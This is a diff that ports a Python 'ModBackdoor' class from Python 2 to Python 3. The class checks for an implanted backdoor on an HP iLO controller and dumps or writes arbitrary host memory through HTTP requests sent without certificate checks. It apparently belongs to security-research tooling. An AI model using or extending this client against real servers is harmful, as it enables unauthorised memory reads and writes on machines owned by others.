@@ -25,20 +25,20 @@ class ModBackdoor():
 			r = requests.get(self.backdoor_url, verify=False)
 		except:
 			if self.verbose:
-				print "[-] Fail contacting iLO"
+				print("[-] Fail contacting iLO")
 			return False
 		if r.status_code != 400:
 			if self.verbose:
-				print "[-] iLO Backdoor not detected"
+				print("[-] iLO Backdoor not detected")
 			return False
 		else:
 			if self.verbose:
-				print "[+] iLO Backdoor found"
+				print("[+] iLO Backdoor found")
 			return True
 
 	def dump_memory(self, addr, count):
 		start=time.time()
-		print "[*] Asked dump of %08x bytes at %016x" % (count, addr)
+		print("[*] Asked dump of %08x bytes at %016x" % (count, addr))
 		asked_count = count
 		addr_hi = addr>>32
 		if addr_hi > 0x7fffffff:
@@ -54,18 +54,18 @@ class ModBackdoor():
 
 		r = requests.get(dump_url, verify=False)
 		if r.status_code != 200:
-			print "[-] Dump failed"
+			print("[-] Dump failed")
 			if len(r.content) > 0:
-				print "\t%s" % r.content
+				print("\t%s" % r.content)
 				return ""
-		print "[+] Dump OK in",(time.time()-start)
+		print("[+] Dump OK in",(time.time()-start))
 		return r.content[:asked_count]
 
 	# Limited by design -> query_string is max 1023 bytes long
 	def write_memory_chunk(self, addr, data):
 		start=time.time()
 		if self.verbose:
-			print "[*] Write 0x%x @%016x" % (len(data),addr)
+			print("[*] Write 0x%x @%016x" % (len(data),addr))
 		addr_hi = addr>>32
 		if addr_hi > 0x7fffffff:
 			addr_hi -= 0x100000000
@@ -77,18 +77,18 @@ class ModBackdoor():
 		r = requests.get(write_url, verify=False)
 		if r.status_code != 200:
 			if self.verbose:
-				print "[-] Write failed"
+				print("[-] Write failed")
 			return ""
 		if self.verbose:
-			print "[+] Write 0x%x in" % len(data),(time.time()-start)
+			print("[+] Write 0x%x in" % len(data),(time.time()-start))
 		return r.content
 
 	def write_memory(self, addr, data):
 		start=time.time()
-		print "[*] Asked write of %08x bytes at %016x" % (len(data), addr)
+		print("[*] Asked write of %08x bytes at %016x" % (len(data), addr))
 		wdata = ""
-		for x in xrange(0, len(data), 0x200):
+		for x in range(0, len(data), 0x200):
 			wdata += self.write_memory_chunk(addr+x, data[x:x+0x200])
-		print "[+] Write done in",(time.time()-start)
+		print("[+] Write done in",(time.time()-start))
 		return wdata
 
